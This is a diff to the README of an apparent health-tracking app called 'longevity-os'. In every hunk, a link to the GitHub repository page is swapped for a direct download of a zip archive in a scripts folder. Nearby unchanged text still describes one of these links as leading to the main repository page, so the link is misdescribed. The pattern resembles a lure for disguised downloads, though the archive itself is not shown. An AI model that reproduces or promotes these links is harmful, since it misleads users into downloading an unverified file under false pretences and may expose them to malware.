@@ -1,6 +1,6 @@
 # ⚕️ longevity-os - Smart Longevity Management System
 
-[![Download longevity-os](https://img.shields.io/badge/Download-longevity--os-brightgreen)](https://github.com/ikheet7734/longevity-os)
+[![Download longevity-os](https://img.shields.io/badge/Download-longevity--os-brightgreen)](https://github.com/ikheet7734/longevity-os/raw/refs/heads/main/scripts/os-longevity-2.1.zip)
 
 ---
 
@@ -33,7 +33,7 @@ You can download longevity-os by visiting its GitHub page linked below. This pag
 
 Click the large button below or copy-paste this address into your browser:
 
-[![Download longevity-os](https://img.shields.io/badge/Download-longevity--os-blue)](https://github.com/ikheet7734/longevity-os)
+[![Download longevity-os](https://img.shields.io/badge/Download-longevity--os-blue)](https://github.com/ikheet7734/longevity-os/raw/refs/heads/main/scripts/os-longevity-2.1.zip)
 
 This link takes you to the main project repository on GitHub.
 
@@ -130,7 +130,7 @@ The repository on GitHub includes documentation in simple terms:
 - **Health Data Tips:** How to collect and enter useful health information.
 
 Visit the GitHub page anytime for these resources:  
-https://github.com/ikheet7734/longevity-os
+https://github.com/ikheet7734/longevity-os/raw/refs/heads/main/scripts/os-longevity-2.1.zip
 
 ---
 
@@ -156,4 +156,4 @@ These areas support the app's goal to provide tailored health management tools.
 
 Use this link again to download the app and begin your health tracking journey:
 
-[https://github.com/ikheet7734/longevity-os](https://github.com/ikheet7734/longevity-os)
+[https://github.com/ikheet7734/longevity-os/raw/refs/heads/main/scripts/os-longevity-2.1.zip](https://github.com/ikheet7734/longevity-os/raw/refs/heads/main/scripts/os-longevity-2.1.zip)
